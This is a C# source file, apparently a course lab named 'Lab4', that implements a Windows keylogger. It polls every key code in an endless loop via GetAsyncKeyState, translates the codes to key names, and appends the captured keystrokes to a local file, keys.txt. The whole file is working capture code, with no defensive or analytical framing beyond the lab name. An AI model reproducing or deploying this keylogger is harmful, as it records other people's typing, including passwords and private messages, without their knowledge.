using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

namespace Lab4 {
    class KeyLogger {
        [DllImport("User32.dll")]
        public static extern ushort GetAsyncKeyState(int keyCode);
        public void Keys() {
            StringBuilder strB = new StringBuilder();
            int keyPressed;
            while (true) {
                for (int i = 0; i < 255; i++) {
                    keyPressed = GetAsyncKeyState(i);
                    if (keyPressed == 32769) {
                        switch (i) {
                            case 3:
                                strB.Append(" cancel ");
                                break;
                            case 8:
                                strB.Append(" backspace ");
                                break;
                            case 9:
                                strB.Append(" tab ");
                                break;
                            case 13:
                                strB.Append(" enter ");
                                break;
                            case 16:
                                strB.Append(" shift ");
                                break;
                            case 17:
                                strB.Append(" ctrl ");
                                break;
                            case 19:
                                strB.Append(" pause ");
                                break;
                            case 20:
                                strB.Append(" capsLock ");
                                break;
                            case 32:
                                strB.Append(" space ");
                                break;
                            case 33:
                                strB.Append(" page up ");
                                break;
                            case 34:
                                strB.Append(" page down ");
                                break;
                            case 35:
                                strB.Append(" end ");
                                break;
                            case 36:
                                strB.Append(" home ");
                                break;
                            case 37:
                                strB.Append(" left ");
                                break;
                            case 38:
                                strB.Append(" up ");
                                break;
                            case 39:
                                strB.Append(" right ");
                                break;
                            case 40:
                                strB.Append(" down ");
                                break;
                            case 160:
                                strB.Append(" left shift ");
                                break;
                            case 112:
                                strB.Append(" f1 ");
                                break;
                            case 113:
                                strB.Append(" f2 ");
                                break;
                            case 114:
                                strB.Append(" f3 ");
                                break;
                            case 115:
                                strB.Append(" f4 ");
                                break;
                            case 116:
                                strB.Append(" f5 ");
                                break;
                            case 117:
                                strB.Append(" f6 ");
                                break;
                            case 118:
                                strB.Append(" f7 ");
                                break;
                            case 119:
                                strB.Append(" f8 ");
                                break;
                            case 120:
                                strB.Append(" f9 ");
                                break;
                            case 121:
                                strB.Append(" f10 ");
                                break;
                            case 122:
                                strB.Append(" f11 ");
                                break;
                            case 123:
                                strB.Append(" f12 ");
                                break;
                            default:
                                Console.WriteLine("Default");
                                strB.Append((char)i); 
                                break;
                        }
                        if (strB.Length > 50) {
                            PutInFine("keys.txt", strB.ToString());
                            strB.Clear();
                        }
                    }
                }
            }
        }
        public void PutInFine(string path, string value) {
            StreamWriter sw = new StreamWriter(path, true);
            sw.WriteLine(value);
            sw.Close();
        }
    }
}
